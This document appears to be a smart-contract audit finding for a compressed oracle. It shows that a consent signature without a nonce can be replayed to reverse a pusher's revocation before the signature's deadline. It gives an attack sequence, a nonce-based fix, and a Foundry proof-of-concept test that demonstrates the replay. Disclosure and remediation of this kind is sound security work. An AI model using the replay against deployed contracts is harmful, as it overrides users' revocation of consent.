### Title
`allowPushers` consent signature has no nonce, making `revokePusher` ineffective before deadline — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`CompressedOracleV1.allowPushers` verifies an EIP-191 consent signature that commits to `(block.chainid, address(this), deadline, pusher, creator)` but contains **no nonce or one-time-use marker**. The same signature is therefore valid for every call to `allowPushers` until the deadline timestamp passes. A creator who holds a pusher's consent signature can replay it to silently re-establish a delegation immediately after the pusher has called `revokePusher`, rendering the pusher's self-revocation permanently ineffective for the lifetime of the signed deadline.

---

### Finding Description

In `allowPushers`, the signed digest is constructed as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The signed payload binds to chain ID, oracle address, deadline, pusher address, and creator address. It does **not** bind to any per-use counter or one-time token. The contract's own NatSpec acknowledges the partial problem:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [2](#0-1) 

The comment correctly identifies that a deadline is needed, but the deadline only prevents replay **after** it expires. Before expiry, the identical signature satisfies `ECDSA.recover` on every call. The revocation path clears `namespaceRemapping[pusher]` to `address(0)`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But nothing prevents the creator from immediately calling `allowPushers` again with the same `(deadline, pusher, sig)` tuple, writing `namespaceRemapping[pusher] = creator` back. The state after revocation is indistinguishable from the state before it.

**Attack sequence:**

1. Pusher signs consent for creator with `deadline = block.timestamp + 365 days`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers(deadline, [pusher], [sig])` with the **same** signature → `namespaceRemapping[pusher] = creator` again.
5. Steps 3–4 can be repeated indefinitely until the deadline passes.

The pusher's fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the pusher makes after the creator's replay lands in the **creator's namespace**, not the pusher's own, feeding the creator's oracle slots — and any pool consuming those slots — with data the pusher no longer intends to provide to that creator.

---

### Impact Explanation

The pusher's `revokePusher` call is rendered permanently ineffective for the duration of the signed deadline. Any pool whose price provider reads from the creator's compressed oracle namespace continues to receive price data attributed to the pusher's pushes, against the pusher's explicit intent. If the pusher is an automated off-chain bot that cannot trivially halt all pushes (e.g., it services many namespaces), the creator can maintain live oracle feeds for their pools without the pusher's ongoing consent. This is an admin-boundary break: the pusher's self-revocation right — the only mechanism the protocol provides for a pusher to exit a delegation — is bypassed by an unprivileged replay of a previously valid signature.

---

### Likelihood Explanation

Medium. The creator must already hold a valid consent signature (obtained legitimately during the original `allowPushers` call). The pusher must have subsequently called `revokePusher`. Both conditions are normal operational events in the delegation lifecycle. No special access or privileged role is required beyond being the creator who originally established the delegation.

---

### Recommendation

Add a per-pusher nonce to the signed message and increment it on every successful `allowPushers` call (or on every `revokePusher` call). This makes every consent signature single-use:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;          // invalidates this signature
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, increment `pusherNonce[pusher]` inside `revokePusher` so that any outstanding consent signature is immediately invalidated the moment the pusher revokes. This is the EIP-712 pattern the external report recommends: a nonce that the signer can advance to cancel all prior signatures.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Foundry test demonstrating that revokePusher is ineffective before deadline.
// Run: forge test --match-test testRevokeBypassViaReplay -vvv

contract ReplayRevokePoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
    }

    function testRevokeBypassViaReplay() public {
        uint256 deadline = block.timestamp + 365 days;

        // 1. Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — revocation undone
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);  // same sig, no revert
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established");

        // 5. Pusher's next push still lands in creator namespace
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(1_000_000) << 16) | (uint48(3) << 8) | uint48(3);
        uint256 word = (uint256(tsMs) << 8) | uint256(uint8(0));
        word |= uint256(raw) << 208;
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);
        // Price lands in creator namespace, not pusher's own
        assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0);
        assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-210)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
